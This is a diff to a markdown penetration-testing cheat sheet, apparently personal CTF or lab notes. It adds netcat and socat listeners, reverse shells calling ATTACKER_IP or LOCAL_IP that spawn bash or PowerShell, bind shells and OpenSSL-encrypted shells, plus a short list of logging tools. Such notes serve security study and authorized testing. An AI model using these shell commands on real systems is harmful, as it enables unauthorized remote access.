@@ -107,8 +107,9 @@
 
 #### Network Services
 
-* [netcat
-  ](https://en.wikipedia.org/wiki/Netcat)
+* [netcat](https://en.wikipedia.org/wiki/Netcat)
+
+  * ``nc -lvnp port``
 * [rlwrap](https://github.com/hanslub42/rlwrap)
 
   * ``rlwrap nc -lvnp port``
@@ -121,6 +122,32 @@
     * ``stty -a``
     * ``stty rows number``
     * ``stty cols number``
+  * ``socat TCP-L:PORT -``
+  * ``socat TCP:TARGET_IP:TARGET_PORT -``
+  * Fully Stable Linux TTY Reverse Shell
+    * Listener
+      ``socat TCP-L:PORT FILE:TTY,raw,echo=0``
+    * Activation Command
+      ``socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane``
+  * Reverse Shells
+    * Windows
+      ``socat TCP:LOCAL_IP:LOCAL_PORT EXEC:powershell.exe,pipes``
+    * Linux
+      ``socat TCP:LOCAL_IP:LOCAL_PORT EXEC:"bash -li"``
+  * Blind Shells
+    * Windows
+      ``socat TCP-L:PORT EXEC:powershell.exe,pipes``
+    * Linux
+      ``socat TCP-L:PORT EXEC:"bash -li"``
+  * Encrypted Shells
+    Replace `TCP` with `OPENSSL`
+    * Generate Certificate
+      ``openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt``
+      ``cat shell.key shell.crt > shell.pem``
+    * Listener
+      ``socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -``
+    * Activation Command
+      ``socat OPENSSL:LOCAL_IP:LOCAL_PORT,verify=0 EXEC:/bin/bash``
   * 
 * [nmap](https://nmap.org/)
 
@@ -174,6 +201,12 @@
   * ``enum4linux -a MACHINE_IP``
 * [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
 * [dsniff](https://www.kali.org/tools/dsniff/)
+* Logging
+
+  * [rsyslog](https://www.rsyslog.com/)
+  * [logrotate](https://linux.die.net/man/8/logrotate)
+  * [splunk](https://www.splunk.com/)
+  * [elastic-search](https://www.elastic.co/elastic-stack)
 * Traffic Analysis
 
   * [wireshark](https://www.wireshark.org/)
